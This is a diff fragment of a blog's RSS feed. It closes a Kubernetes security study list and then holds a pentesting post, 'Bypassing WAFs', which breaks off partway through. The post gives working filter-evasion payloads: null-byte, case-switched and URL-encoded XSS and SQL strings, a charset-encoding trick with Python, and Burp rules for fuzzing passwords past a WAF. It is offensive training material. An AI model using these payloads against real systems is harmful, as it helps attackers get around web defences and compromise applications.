+&lt;h4 id=&#34;practice-the-use-of-kube-bench-to-detect-cluster-component-vulnerabilities&#34;&gt;Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Kubernetes CIS Benchmark&lt;/strong&gt;: A set of best practices for recommended security settings in a production Kubernetes environment.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Automation with &lt;code&gt;kube-bench&lt;/code&gt;&lt;/strong&gt;: Automate the detection of security risks using &lt;code&gt;kube-bench&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Report Interpretation&lt;/strong&gt;: The generated report describes detailed remediation actions to fix detected issues. Learn to interpret the results and mitigate issues.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;know-how-to-configure-ingress-with-tls-termination&#34;&gt;Know How to Configure Ingress with TLS Termination**&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Ingress Configuration&lt;/strong&gt;: An Ingress can be configured to expose an HTTPS endpoint to send and receive encrypted data.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;TLS Secret&lt;/strong&gt;: Create a TLS Secret object and assign it a TLS certificate and key. The Secret can be consumed by the Ingress using the &lt;code&gt;spec.tls[]&lt;/code&gt; attribute.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;know-how-to-configure-gui-elements-for-secure-access&#34;&gt;Know How to Configure GUI Elements for Secure Access**&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;GUI Protection&lt;/strong&gt;: GUI elements, like the Kubernetes Dashboard, must be protected from unauthorized access to prevent potential harm.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;RBAC Configuration&lt;/strong&gt;: Properly set up RBAC (Role-Based Access Control) for specific stakeholders.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Security-Related Command Line Arguments&lt;/strong&gt;: Have a rough understanding of security-related command line arguments. Practice installing the Dashboard, tweaking command line arguments, and setting permissions for different users.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;know-how-to-detect-modified-platform-binaries&#34;&gt;Know How to Detect Modified Platform Binaries&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Binary Verification&lt;/strong&gt;: Platform binaries like &lt;code&gt;kubectl&lt;/code&gt; and &lt;code&gt;kubeadm&lt;/code&gt; can be verified against their corresponding hash codes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hash Files and Validation&lt;/strong&gt;: Know where to find the hash files and how to use validation tools to check if the binaries have been tampered with.&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Bypassing WAFs</title>
+      <link>http://localhost:1313/newblog/posts/bypassing-wafs/</link>
+      <pubDate>Sat, 05 Aug 2023 00:15:21 +0100</pubDate>
+      
+      <guid>http://localhost:1313/newblog/posts/bypassing-wafs/</guid>
+      <description>Have you ever been blocked by a webserver that you are performing pentesting on ? Check out the best techniques used Bypass WAFs and perform your Bug Hunting/ Pentesting without obstacles !</description>
+      <content>&lt;h2 id=&#34;i---toolkits&#34;&gt;I - Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nmap&lt;/code&gt;  http-waf-detect&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wafw00f&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ffuf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wfuzz&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;IP Rotate&lt;/code&gt; Burp Extension&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ii---detecting-waf&#34;&gt;II - Detecting WAF&lt;/h2&gt;
+&lt;p&gt;We get detected by :
+&lt;em&gt;IP address&lt;/em&gt;, &lt;em&gt;origin&lt;/em&gt; &lt;strong&gt;headers&lt;/strong&gt;, &lt;em&gt;authorization tokens&lt;/em&gt;, and &lt;em&gt;metadata&lt;/em&gt;. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended. That way, you should have a chance to understand the app’s functionality before getting into trouble. You could, for example, review documentation or build out a collection of valid requests and then map out the API as a valid user.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;A &lt;em&gt;302&lt;/em&gt; &lt;em&gt;response&lt;/em&gt; that forwards you to a CDN&lt;/li&gt;
+&lt;li&gt;Using &lt;em&gt;nmap&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -p &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; –script http-waf-detect http://hapihacker.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Using &lt;em&gt;Wafw00f&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wafw00f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;target&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Paying attention to &lt;em&gt;headers&lt;/em&gt; such as &lt;em&gt;X-CDN&lt;/em&gt;,&lt;em&gt;CDNs&lt;/em&gt; provide a way to reduce latency globally by caching the API pro-
+vider’s requests. ,  CDNs will often provide WAFs as a service
+&lt;strong&gt;X-CDN&lt;/strong&gt;: akamai
+&lt;strong&gt;X-CDN&lt;/strong&gt;: Incapsula
+&lt;strong&gt;X-Kong-Proxy-Latency&lt;/strong&gt;: 123
+&lt;strong&gt;Server&lt;/strong&gt;: Zenedge
+&amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iii---evasing-waf&#34;&gt;III - Evasing WAF&lt;/h2&gt;
+&lt;h3 id=&#34;1----null-bytes&#34;&gt;1 -  Null Bytes&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Could terminate the API security control filters that may be in place.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;If the null byte is processed by a backend program thatvalidates user input, that validation program could be bypassed because itstops processing the input.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;string terminators you can use&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Can be placed in &lt;strong&gt;different parts&lt;/strong&gt; of the request to attempt to bypass any restrictions in place,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%00cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%00cript&amp;gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;--&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;We&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;even&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;it&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;than&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;once&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;same&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;place&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%000000cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%000000cript&amp;gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wordlist&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;~/tools/SecLists&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;-2023.2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Fuzzing/Metacharacters.fuzzdb.txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2---case-switching&#34;&gt;2 - Case Switching&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;sCriPt&amp;gt;alert(&amp;#39;supervuln&amp;#39;)&amp;lt;/scrIpT&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;SeLeCT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RoM&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;all_tables&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;sELecT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@@vErSion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3----encoding&#34;&gt;3 -  Encoding&lt;/h3&gt;
+&lt;p&gt;When encoding, focus on the characters that may be blocked, such as
+these:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; [ ] { } &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You could either encode part of a payload or encode all&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cscript%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;supervuln%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;fscript&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert(&amp;#39;supervuln&amp;#39;)%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;f%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;11---charset-encoding&#34;&gt;1.1 - Charset Encoding&lt;/h4&gt;
+&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Charset encoding&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded;charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037,boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##Python code&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quote_plus(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IBM037&amp;#34;&lt;/span&gt;))) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## Request example&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: buggy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Type: application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm500
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;KKaKKa&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C6&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;D3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C1&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C7K&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;L&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7n
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4---automation-wburp-intruder--wfuzz&#34;&gt;4 - Automation w/&lt;em&gt;Burp Intruder&lt;/em&gt; &amp;amp; &lt;em&gt;Wfuzz&lt;/em&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Intruder&lt;/em&gt; -&amp;gt; &lt;em&gt;Payloads&lt;/em&gt;, &lt;strong&gt;Payload Processing Option&lt;/strong&gt; allows you to add rules that Burp will apply to each payload before it is sent.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Let&amp;rsquo;s say we can bypass WAF by The following rule , we can apply it then start fuzzing for passwords or whatso&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Rules are applied from &lt;strong&gt;TOP&lt;/strong&gt; to &lt;strong&gt;BOTTOM&lt;/strong&gt; , in this example , suffix and prefix are added after encoding so they are not encoded.
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_004051.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Wfuzz&lt;/code&gt; &lt;a href=&#34;https://wfuzz.readthedocs.io/en/latest/user/advanced.html#iterators-combining-payloads&#34;&gt;Usage&lt;/a&gt;&lt;/p&gt;
